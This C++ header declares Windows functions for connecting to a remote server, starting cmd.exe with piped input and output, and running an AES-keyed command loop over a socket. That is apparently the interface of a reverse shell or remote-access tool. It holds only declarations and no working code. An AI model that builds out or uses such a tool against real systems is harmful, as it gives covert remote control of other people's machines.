#ifndef EXEC_H
#define EXEC_H

#include <winsock2.h>
#include <windows.h>
#include <string>


bool initWinsock();

SOCKET connectToServer(const std::string& ip, int port);

bool launchCmdProcess(
    HANDLE& hReadOut,
    HANDLE& hWriteOut,
    HANDLE& hReadIn,
    HANDLE& hWriteIn,
    PROCESS_INFORMATION& pi
);

void commandLoop(
    SOCKET& s,
    HANDLE hReadOut,
    HANDLE hWriteIn,
    const std::string& ip,
    int port,
    std::string& KeyAes
);

void cleanup(
    SOCKET s,
    HANDLE hReadOut,
    HANDLE hWriteIn,
    PROCESS_INFORMATION& pi
);
std::string send_keys(SOCKET& s);

#endif // EXEC_H